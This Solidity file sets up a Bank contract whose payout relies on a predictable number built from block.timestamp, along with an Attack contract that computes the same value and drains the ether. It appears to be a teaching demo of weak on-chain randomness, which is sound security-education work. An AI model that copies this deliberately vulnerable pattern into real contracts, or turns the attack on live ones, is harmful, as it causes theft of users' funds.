// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

contract Bank {
    uint balance;

    /// @notice deposit a given amount of ether
    function deposit() public payable {
        balance += msg.value;
    }

    /// @notice send 1 ether if the given guess is matched with the random number
    function guess(uint _guess) public payable {
        uint answer = uint(
            keccak256(abi.encodePacked(address(this), block.timestamp))
        );

        if (_guess == answer) {
            balance --;
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }

    // @notice Get the balance of Ether held by the contract.
    // @return The balance of the contract in wei.
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    Bank public bank;

    constructor (Bank _bank) {
        bank = Bank(_bank);
    }

    receive() external payable {
    }

    function attack() public {
        uint answer = uint(
            keccak256(abi.encodePacked(address(bank), block.timestamp))
        );

        bank.guess(answer);

        uint attackerBalance = address(this).balance;
        payable(msg.sender).transfer(attackerBalance);
    }
}
